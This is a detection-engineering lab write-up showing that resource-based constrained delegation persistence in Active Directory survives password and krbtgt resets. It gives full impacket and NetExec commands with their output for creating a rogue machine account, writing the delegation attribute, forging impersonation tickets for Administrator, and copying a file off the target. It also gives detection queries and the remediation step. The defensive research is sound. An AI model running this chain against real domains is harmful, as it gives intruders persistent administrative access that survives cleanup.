#  Resource-Scoped Persistence Survives Credential-Centric AD Remediation
## Resource-Based Constrained Delegation as a Post-IR Persistence Mechanism

**Date:** 2026-05-20
**Platform:** Windows Server 2019 DC (WIN-JOCP945SK51) / Windows Server 2022 Target (WIN-ATTACK)
**Domain:** lab2019.local
**Attacker:** Kali Linux — impacket 0.13.0, nxc (NetExec)

> This is a detection engineering document. The focus is on what survives a credential-centric Active Directory remediation cycle, why it survives, and what explicit remediation looks like. Offensive mechanics beyond what is necessary to document the finding are intentionally omitted.

---

## Research Question

Does resource-based constrained delegation configured on a computer object survive a standard credential-centric incident response remediation cycle, and can an attacker maintain operational access using only their own unrotated credentials post-IR?

---

## Threat Model

Assumed breach. Attacker has obtained Domain Admin. The technique does not require DA to persist — any principal with write access to the target computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute is sufficient. DA is used here to simplify the lab setup.

The IR cycle modeled is credential-centric: it focuses on who has access rather than what grants access. This models a common credential-centric remediation pattern observed in Active Directory incident response — reset compromised accounts, double-reset krbtgt to invalidate Golden Tickets, disable and re-enable affected machine accounts. It does not include enumeration of delegation state on computer objects.

This gap emerges from how most credential-focused remediation workflows prioritize credential rotation over authorization-state review. Delegation attributes on computer objects are not part of standard IR playbooks. They are not audited by default. The telemetry to detect writes exists but is not operationalized.

---

## Environment

| Host | IP | OS | Role |
|---|---|---|---|
| Kali | 192.168.1.x | Debian 13 | Attacker |
| WIN-JOCP945SK51 | 192.168.1.251 | Server 2019 | DC / KDC |
| WIN-ATTACK | 192.168.1.84 | Server 2022 | Target (delegate-to) |

---

## Attack Chain

### Phase 1 — Baseline

Confirm `msDS-AllowedToActOnBehalfOfOtherIdentity` is empty on WIN-ATTACK$ before any modification.

```bash
impacket-rbcd lab2019.local/Administrator:'[redacted]' -dc-ip 192.168.1.251 -action read -delegate-to 'WIN-ATTACK$' -use-ldaps
```

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
```

![baseline](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/baseline.png?raw=true)

Clean environment confirmed.

---

### Phase 2 — Persistence Written

Create a machine account under attacker control, then write the RBCD attribute on the target computer object. The domain now trusts RBCDATTACKER$ to impersonate any user to WIN-ATTACK via S4U2Proxy.

```bash
impacket-addcomputer lab2019.local/Administrator:'[redacted]' -dc-ip 192.168.1.251 -computer-name 'RBCDATTACKER$' -computer-pass 'Passw0rd123!' -method LDAPS
```

```
[*] Successfully added machine account RBCDATTACKER$ with password Passw0rd123!.
```

![machine account created](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/rbcdatackemachineaccountcreated.png?raw=true)

```bash
impacket-rbcd lab2019.local/Administrator:'[redacted]' -dc-ip 192.168.1.251 -action write -delegate-from 'RBCDATTACKER$' -delegate-to 'WIN-ATTACK$' -use-ldaps
```

```
[*] Delegation rights modified successfully!
[*] RBCDATTACKER$ can now impersonate users on WIN-ATTACK$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     RBCDATTACKER$   (S-1-5-21-3984567624-304424726-3877085034-2102)
```

![attribute written](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/RBCDATTRIBUTEWRITTEN.png?raw=true)

Read-back confirms the attribute is set with the expected SID.

![read back](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/REDBACKRBCDATTRIBUTE.png?raw=true)

Both SIDs match across write and read operations. Pre-IR state is locked in.

![SIDs match](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/attributewrittenandreadSID.png?raw=true)

---

### Phase 3 — IR Simulation

Credential-centric remediation. Administrator password reset and krbtgt double reset to invalidate forged Kerberos tickets. No enumeration of delegation attributes on computer objects was performed.

```powershell
Set-ADAccountPassword -Identity Administrator -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Reset
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString 'KrbtgtPass1!' -AsPlainText -Force) -Reset
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString 'KrbtgtPass2!' -AsPlainText -Force) -Reset
```

No output. All three resets succeeded.

![IR simulation](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/IR.png?raw=true)

`msDS-AllowedToActOnBehalfOfOtherIdentity` on WIN-ATTACK$ was never examined. RBCDATTACKER$ credentials were never rotated. The machine account was never disabled or removed. Because the account was attacker-created but not identified during remediation, it remained a valid Kerberos principal after credential rotation activities completed.

The krbtgt resets invalidate forged Kerberos tickets derived from prior krbtgt material. They do not modify delegation metadata stored on computer objects in Active Directory. Because RBCD authorization is evaluated dynamically by the KDC from the target computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, the delegation relationship remains valid unless explicitly removed. The KDC is not malfunctioning — it is honoring the authorization state that AD presents to it.

The persistence mechanism survives because the trust relationship is stored on the resource object itself rather than derived from the compromised credentials that IR rotated. Rotating credentials does not alter the authorization state encoded in the directory.

---

### Phase 4 — Persistence Confirmed

Read the attribute back using the new post-IR Administrator credentials.

```bash
impacket-rbcd lab2019.local/Administrator:'NewPass123!' -dc-ip 192.168.1.251 -action read -delegate-to 'WIN-ATTACK$' -use-ldaps
```

```
[*] Accounts allowed to act on behalf of other identity:
[*]     RBCDATTACKER$   (S-1-5-21-3984567624-304424726-3877085034-2102)
```

![persistence confirmed](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/persistence.png?raw=true)

Identical SID. The IR cycle — including krbtgt double reset — touched no resource-scoped delegation attributes.

---

### Phase 5 — Operational Validation

Using only RBCDATTACKER$ credentials. No DA. No rotated credentials.

```bash
impacket-getST lab2019.local/RBCDATTACKER$:'Passw0rd123!' -dc-ip 192.168.1.251 -spn cifs/WIN-ATTACK.lab2019.local -impersonate Administrator
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WIN-ATTACK.lab2019.local@LAB2019.LOCAL.ccache
```

![S4U2 chain](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/succeededwitunrotatedcreds.png?raw=true)

The KDC successfully issued the S4U2self and S4U2proxy service tickets requested by the attacker-controlled machine account. The KDC honored the impersonation request because the delegation state was never remediated.

The Kerberos service ticket was consumed via nxc using `--use-kcache`. No credentials passed at authentication time — the ccache derived from RBCDATTACKER$ credentials was sufficient.

```bash
export KRB5CCNAME=Administrator@cifs_WIN-ATTACK.lab2019.local@LAB2019.LOCAL.ccache
nxc smb WIN-ATTACK.lab2019.local -u Administrator -k --use-kcache --get-file 'Windows\System32\drivers\etc\hosts' /tmp/hosts_exfil
```

```
[+] lab2019.local\Administrator from ccache (Pwn3d!)
[+] File "Windows\System32\drivers\etc\hosts" was downloaded to "/tmp/hosts_exfil"
```

![file exfiltration](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/File_Exfilvianxc.png?raw=true)

Administrative SMB access to the target system was successfully obtained post-remediation. No credentials entered post-IR. No rotated credential touched. No previously compromised privileged credential was required post-remediation — the attacker authenticated exclusively with the pre-positioned machine account created before IR.

**Note on Server 2025:** The S4U2 chain was validated against a Server 2022 target. On Server 2025, ticket issuance is confirmed at the KDC layer — S4U2self and S4U2proxy succeed identically. Shell consumption via impacket's SMB layer is blocked by Server 2025 Kerberos negotiation strictness; this is a tooling limitation, not a finding limitation. The delegation primitive is identical regardless of execution surface. What the attacker does with the issued ticket — whether consumed via impacket on Server 2022, Rubeus on a domain-joined foothold, or another execution path — is an implementation detail. The trust relationship in AD was never remediated.

---

### Phase 6 — Explicit Remediation

What IR would need to do but doesn't:

```powershell
Set-ADComputer WIN-ATTACK -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

![remediation](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/completeremediation.png?raw=true)

Attribute confirmed empty.

```bash
impacket-rbcd lab2019.local/Administrator:'NewPass123!' -dc-ip 192.168.1.251 -action read -delegate-to 'WIN-ATTACK$' -use-ldaps
```

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
```

![attribute cleared](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/confirmrbcdattributeiscleanpostremediation.png?raw=true)

S4U2 chain now fails at the KDC layer:

```bash
impacket-getST lab2019.local/RBCDATTACKER$:'Passw0rd123!' -dc-ip 192.168.1.251 -spn cifs/WIN-ATTACK.lab2019.local -impersonate Administrator
```

```
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user RBCDATTACKER$ or initial TGT not forwardable
```

![chain dead](https://github.com/osherjacobs/AD-Lab-Research/blob/main/screenshots/failurepostfullremediation.png?raw=true)

`KDC_ERR_BADOPTION`. The delegation state is gone. The chain is dead.

---

## The Finding

Credential-centric IR remediation — including krbtgt double reset — does not remove resource-based constrained delegation persistence. The attacker's machine account credentials were never rotated. The delegation attribute was never audited. The KDC continued honoring impersonation requests post-IR.

> IR focused on principals. The attacker owned a resource attribute.
> Those are different trust surfaces.

Password resets remediate credential exposure. They do not remediate delegation-state persistence. These are different trust surfaces, and most IR playbooks treat only one of them.

---

## Detection

### EID 5136 — Directory Service Object Modification

Write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object generates EID 5136. This is the primary detection point.

**Requirement:** SACL pre-configured on computer objects auditing writes to `msDS-AllowedToActOnBehalfOfOtherIdentity`. Not present by default. Not wired to alert by default.

The telemetry exists. The operationalization does not.

**Hunting query:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5136} |
Where-Object { $_.Message -match 'msDS-AllowedToActOnBehalfOfOtherIdentity' }
```

### EID 4769 — Kerberos Service Ticket Request

S4U2self and S4U2proxy generate EID 4769 entries. High volume, low signal without correlation to delegation state and principal behavior.

---

## Remediation

Post-IR validation must include explicit enumeration of `msDS-AllowedToActOnBehalfOfOtherIdentity` across all computer objects. This is not a standard step in documented IR playbooks.

**LDAP query:**
```powershell
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null } |
Select-Object Name, 'msDS-AllowedToActOnBehalfOfOtherIdentity'
```

**BloodHound:** re-ingest post-IR and review delegation edges.

Neither is commonly included in credential-focused remediation workflows. Both materially improve visibility into delegation persistence.

---

## MITRE ATT&CK

| Technique | ID |
|---|---|
| Resource-Based Constrained Delegation | T1134.001 |
| Account Manipulation | T1098 |
| Valid Accounts: Domain Accounts | T1078.002 |
| Steal or Forge Kerberos Tickets | T1558 |

---

## Tools Used

| Tool | Purpose |
|---|---|
| impacket-addcomputer | Machine account creation |
| impacket-rbcd | RBCD attribute write/read |
| impacket-getST | S4U2 ticket chain |
| nxc (NetExec) | SMB authentication and file access via kcache |

---

*Lab environment. All credentials redacted. Do not use against systems you do not own or have explicit written permission to test.*
